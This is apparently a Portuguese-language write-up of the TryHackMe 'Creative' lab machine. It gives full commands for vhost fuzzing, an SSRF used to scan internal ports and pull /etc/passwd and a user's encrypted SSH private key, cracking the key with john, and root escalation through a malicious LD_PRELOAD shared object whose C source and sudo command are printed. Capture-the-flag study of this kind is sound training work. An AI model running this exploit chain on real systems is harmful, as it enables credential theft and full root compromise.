<div align="center">

# 🚀 TryHackMe – Creative (Write‑up)

*“Se você pode pré‑carregar, você pode possuir.”* 🕶️💻

<p align="center">
  
</p>

</div>

---

## 📌 Informações da Máquina

* **Nome:** Creative
* **Plataforma:** TryHackMe
* **Link:** [https://tryhackme.com/room/creative](https://tryhackme.com/room/creative)
* **SO:** Linux (Ubuntu)
* **Serviços‑chave:** SSH (22), HTTP/nginx (80), VHost redirect
* **Dificuldade:** 🟢 Easy
* **Tempo estimado:** ⏱️ 120 min
* **Status:** ✅ Rooted com sucesso

---

## 🗺️ Roadmap da exploração

```mermaid
graph TD
  A["Enumeração (Nmap)"] --> B["VHost + Host-Header fuzz"]
  B --> C["SSRF em beta.creative.thm"]
  C --> D["Fileserver local 127.0.0.1:1337"]
  D --> E["Exfil: /home/saad/.ssh/id_rsa"]
  E --> F["Passphrase 'sweetness' → SSH saad"]
  F --> G["sudo -l com env_keep+=LD_PRELOAD"]
  G --> H["LD_PRELOAD rootshell.so via /usr/bin/ping"]
  H --> I["Root flag"]
```



---

## 🔍 Enumeração inicial

Variáveis de conveniência:

```bash
ALVO="10.201.112.53"; LOCAL="10.201.15.227"
```

Conectividade:

```bash
ping -c 3 $ALVO | grep -o "=64"
# =64
# =64
# =64
```

Nmap completo (scripts + versões + todas as portas):

```bash
nmap -T4 -n -sC -sV -Pn -p- $ALVO
```

**Achados relevantes:**

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
http-title: Did not follow redirect to http://creative.thm
```

### Preparando resolução local (VHosts)

Adicione os hosts no seu `/etc/hosts`:

```text
10.201.112.53  creative.thm
```

---

## 🌐 VHost fuzz → descobrindo o subsite

Fuzz de virtual hosts (forçando Host header):

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
     -u http://creative.thm/ -H "Host:FUZZ.creative.thm" -fw 6
```

**Resultados:**

```
beta  [Status: 200]
BETA  [Status: 200]
```

Adicione o novo host ao `/etc/hosts` para evitar dores de cabeça depois:

```text
10.201.112.53  creative.thm beta.creative.thm
```

---

## 🛰️ SSRF em `beta.creative.thm`

O endpoint aceita `POST` com `Content-Type: application/x-www-form-urlencoded` e parâmetro **`url=`**, permitindo que o servidor faça requisições internas (SSRF).

**Port scan interno por SSRF:**

```bash
ffuf -u http://beta.creative.thm/ \
     -d "url=http://127.0.0.1:FUZZ/" \
     -w <(seq 1 65535) \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -mc all -t 100 -fs 13
```

**Portas internas descobertas:**

```
80   [200]
1337 [200]
```

A porta **1337** retorna *Directory Listing* do **filesystem “/”** do host quando acessada via SSRF:

```bash
curl -s -X POST http://beta.creative.thm/ \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'url=http://127.0.0.1:1337/'
```

---

## 🗂️ Exfiltrando arquivos pelo fileserver local

Obter usuários reais:

```bash
curl -sX POST http://beta.creative.thm/ -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'url=http://127.0.0.1:1337/etc/passwd'
```

**Usuários com shell:** `root`, `saad` (UID 1000), `ubuntu` (UID 1001)

Listar `.ssh` do **saad**:

```bash
curl -sX POST http://beta.creative.thm/ -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'url=http://127.0.0.1:1337/home/saad/.ssh/'
```

Arquivos presentes: `authorized_keys`, `id_rsa`, `id_rsa.pub`, `known_hosts`
(`ubuntu` → *Dead*)

Baixar a chave privada e ajustar permissões:

```bash
curl -sX POST http://beta.creative.thm/ -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'url=http://127.0.0.1:1337/home/saad/.ssh/id_rsa' > saad_id_rsa
chmod 600 saad_id_rsa
```

A chave estava criptografada (OpenSSH/bcrypt).

---

## 🔑 Desbloqueando a chave & acesso SSH

Gerando o hash com `ssh2john.py` e quebrando com `john` + rockyou:

```bash
python3 /opt/john/ssh2john.py saad_id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# *****        (saad_id_rsa)
```

A **passphrase** é **`*****`**. Conectar como **saad**:

```bash
ssh -i saad_id_rsa saad@10.201.112.53
```

**Flag de usuário:**

```text
/home/saad/user.txt → *****
```

Do `.bash_history` do usuário:

```
*****
```

---

## ⚡ Privesc via `LD_PRELOAD` + `ping`

`sudo -l` mostra:

* `env_keep+=LD_PRELOAD` (sudo preserva a variável)
* `(root) /usr/bin/ping` permitido

Isso permite **pré‑carregar** uma `.so` maliciosa que abre root shell **antes** do `main()` do binário alvo.

### 1) Biblioteca maliciosa

```c
// /home/saad/rootshell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init(void) {
    unsetenv("LD_PRELOAD");   // evita herança no bash
    setgid(0); setuid(0);     // assegura privilégios
    system("/bin/bash -p");  // shell preservando euid/gid
}
```

### 2) Compilação

```bash
gcc -fPIC -shared -o /home/saad/rootshell.so /home/saad/rootshell.c -nostartfiles
```

### 3) Execução privilegiada

```bash
sudo LD_PRELOAD=/home/saad/rootshell.so /usr/bin/ping -c 1 127.0.0.1
# senha sudo: *****
```

Caiu em **root shell**:

```text
uid=0(root) gid=0(root) groups=0(root)
```

**Flag root:**

```text
/root/root.txt → *****
```

---

## 🧠 Por que o privesc funciona (visão profunda)

1. `sudo` executa `/usr/bin/ping` **como root** e **preserva `LD_PRELOAD`** (sudoers).
2. O loader dinâmico (ld‑linux) lê `LD_PRELOAD` e **injeta** a `.so` antes das libs padrão.
3. O **construtor** (`_init`) da `.so` roda **antes do `main()`** do alvo.
4. `_init` eleva/garante privilégios (`setuid(0)/setgid(0)`) e abre `/bin/bash -p`.
5. `unsetenv("LD_PRELOAD")` evita loop/ruído no shell resultante.

---

## 🗃️ Apêndice – Comandos essenciais

```bash
# Recon
nmap -T4 -n -sC -sV -Pn -p- 10.201.112.53

# /etc/hosts
echo "10.201.112.53 creative.thm beta.creative.thm" | sudo tee -a /etc/hosts

# SSRF base
curl -s -X POST http://beta.creative.thm/ \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'url=http://127.0.0.1:1337/'

# Exfil chave
curl -sX POST http://beta.creative.thm/ -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'url=http://127.0.0.1:1337/home/saad/.ssh/id_rsa' > saad_id_rsa
chmod 600 saad_id_rsa

# Desbloqueio
python3 /opt/john/ssh2john.py saad_id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# SSH
ssh -i saad_id_rsa saad@10.201.112.53  # passphrase: *****

# Privesc (LD_PRELOAD)
cat >/home/saad/rootshell.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init(void){unsetenv("LD_PRELOAD");setgid(0);setuid(0);system("/bin/bash -p");}
EOF

gcc -fPIC -shared -o /home/saad/rootshell.so /home/saad/rootshell.c -nostartfiles
sudo LD_PRELOAD=/home/saad/rootshell.so /usr/bin/ping -c 1 127.0.0.1
```

---

<div align="center">


